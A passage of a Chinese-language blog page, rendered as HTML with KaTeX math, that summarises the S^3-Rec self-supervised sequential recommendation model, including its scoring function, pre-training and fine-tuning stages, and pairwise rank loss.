stretchy=\"false\">(</mo><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">f(.,.)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mclose\">)</span></span></span></span> 表示为:</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>C</mi><msub><mi>i</mi><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub></msub><mo separator=\"true\">,</mo><msub><mi>i</mi><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub><mo stretchy=\"false\">)</mo><mo>=</mo><mi>σ</mi><mo stretchy=\"false\">(</mo><msup><mi mathvariant=\"bold\">s</mi><mi mathvariant=\"normal\">⊤</mi></msup><mo>⋅</mo><msub><mi mathvariant=\"bold\">W</mi><mrow><mi>S</mi><mi>P</mi></mrow></msub><mo>⋅</mo><mover accent=\"true\"><mi mathvariant=\"bold\">s</mi><mo>~</mo></mover><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">f(C_{i_{j_1:j_2}},i_{j_1:j_2})=\\sigma(\\mathbf{s}^\\top\\cdot\\mathbf{W}_{SP}\\cdot\\tilde{\\mathbf{s}})\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.14992em;vertical-align:-0.39992em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.3569999999999998em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:-0.05724em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.64444em;\"></span><span class=\"mord mtight\">1</span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29964em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:-0.05724em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.64444em;\"></span><span class=\"mord mtight\">2</span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29964em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3570285714285715em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.39992em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.149108em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">s</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">⊤</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83611em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6812999999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">s</span></span></span></span><span style=\"top:-3.36344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.19444em;\"><span class=\"mord\">~</span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></span></p>\n<ul>\n<li>其中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mrow><mi>S</mi><mi>P</mi></mrow></msub><mo>∈</mo><msup><mi mathvariant=\"script\">R</mi><mrow><mi>d</mi><mo>×</mo><mi>d</mi></mrow></msup></mrow><annotation encoding=\"application/x-tex\">W_{SP}\\in \\mathcal R^{d \\times d}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8491079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathcal\">R</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8491079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">d</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">d</span></span></span></span></span></span></span></span></span></span></span></span> 是需要学习的参数矩阵</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mtext>和</mtext><mover accent=\"true\"><mi>s</mi><mo>~</mo></mover></mrow><annotation encoding=\"application/x-tex\">s和\\tilde s</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord cjk_fallback\">和</span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">s</span></span><span style=\"top:-3.35em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.19444em;\"><span class=\"mord\">~</span></span></span></span></span></span></span></span></span></span> 分别是上下文<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>C</mi><msub><mi>i</mi><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub></msub></mrow><annotation encoding=\"application/x-tex\">C_{i_{j_1:j_2}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.08325em;vertical-align:-0.39992em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.3569999999999998em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:-0.05724em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.64444em;\"></span><span class=\"mord mtight\">1</span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29964em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3447999999999998em;margin-left:-0.05724em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.64444em;\"></span><span class=\"mord mtight\">2</span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.29964em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3570285714285715em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.39992em;\"><span></span></span></span></span></span></span></span></span></span> 和子序列<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>i</mi><mrow><msub><mi>j</mi><mn>1</mn></msub><mo>:</mo><msub><mi>j</mi><mn>2</mn></msub></mrow></msub></mrow><annotation encoding=\"application/x-tex\">i_{j_1:j_2}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9456279999999999em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mrel mtight\">:</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31731428571428577em;\"><span style=\"top:-2.357em;margin-left:-0.05724em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 学习到的表示</li>\n<li>应用双向 Transformer 来获取序列中最后一个位置的状态表示</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"学习和讨论\"><a class=\"anchor\" href=\"#学习和讨论\">#</a> 学习和讨论</h2>\n<p>在本部分中，我们介绍了用于顺序推荐的 $ S^3-Rec $ 的学习和相关讨论</p>\n<h3 id=\"学习部分\"><a class=\"anchor\" href=\"#学习部分\">#</a> 学习部分</h3>\n<ul>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>S</mi><mn>3</mn></msup><mo>−</mo><mi>R</mi><mi>e</mi><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">S^3-Rec</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.897438em;vertical-align:-0.08333em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span></span></span></span> 包含两个重要阶段 ——<strong> 预训练</strong>和<strong>微调</strong>阶段</p>\n</li>\n<li>\n<p>对两个阶段分别采用双向和单向 Transformer 架构</p>\n</li>\n<li>\n<p>在预训练阶段，考虑四种不同的类型的相关性来优化自监督学习目标</p>\n</li>\n<li>\n<p>在微调阶段利用预训练阶段学习到的参数来初始化单向 Transformer 的参数，然后利用从左到右的监督信号来训练网络</p>\n</li>\n<li>\n<p>采用成对秩损失来优化其参数:</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi>L</mi><mrow><mi>m</mi><mi>a</mi><mi>i</mi><mi>n</mi></mrow></msub><mo>=</mo><mo>−</mo><munder><mo>∑</mo><mrow><mi>u</mi><mo>∈</mo><mi mathvariant=\"script\">U</mi></mrow></munder><munderover><mo>∑</mo><mrow><mi>t</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>log</mi><mo>⁡</mo><mi>σ</mi><mo fence=\"true\">(</mo><mi>P</mi><mo stretchy=\"false\">(</mo><msub><mi>i</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><mi mathvariant=\"normal\">∣</mi><msub><mi>i</mi><mrow><mn>1</mn><mo>:</mo><mi>t</mi></mrow></msub><mo stretchy=\"false\">)</mo><mo>−</mo><mi>P</mi><mo stretchy=\"false\">(</mo><msubsup><mi>i</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow><mo>−</mo></msubsup><mi mathvariant=\"normal\">∣</mi><msub><mi>i</mi><mrow><mn>1</mn><mo>:</mo><mi>t</mi></mrow></msub><mo stretchy=\"false\">)</mo><mo fence=\"true\">)</mo><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">L_{main}=-\\sum_{u\\in\\mathcal{U}}\\sum_{t=1}^n\\log\\sigma\\biggl(P(i_{t+1}|i_{1:t})-P(i_{t+1}^-|i_{1:t})\\biggr),\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span><span class=\"mord mathnormal mtight\">a</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.973103em;vertical-align:-1.321706em;\"></span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8556639999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">u</span><span class=\"mrel mtight\">∈</span><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.09931em;\">U</span></span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.321706em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.6513970000000002em;\"><span style=\"top:-1.882887em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.050005em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.3000050000000005em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.267113em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mopen\"><span class=\"delimsizing size3\">(</span></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.301108em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.208331em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mrel mtight\">:</span><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.40003em;vertical-align:-0.95003em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.821331em;\"><span style=\"top:-2.443561em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mbin mtight\">−</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31477em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathnormal\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mrel mtight\">:</span><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\"><span class=\"delimsizing size3\">)</span></span><span class=\"mpunct\">,</span></span></span></span></span></p>\n<ul>\n<li>我们将每个真实项 $ i_<ruby>t+1 }$ 与随机抽样的负项 $ i<rp>(</rp><rt>-_{t+1 </rt><rp>)</rp></ruby>$ 配对。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"讨论\"><a class=\"anchor\" href=\"#讨论\">#</a> 讨论</h3>\n<ul>\n<li>通过预训练模型从输入中捕获内在数据相关性作为附加信号</li>\n<li>这种方法非常通用，因此许多现有方法都可以纳入此框架</li>\n</ul>\n<h4 id=\"基于特征的方法\"><a class=\"anchor\" href=\"#基于特征的方法\">#</a> 基于特征的方法</h4>\n<ul>\n<li>主要通过上下文特征的交互来学习数据表示</li>\n<li>根据用户与物品特征的实际交互结果进行最终预测</li>\n<li>在本文中相关属性预测损失为公式<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mrow><mi>A</mi><mi>A</mi><mi>P</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">L_{AAP}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">A</span><span class=\"mord 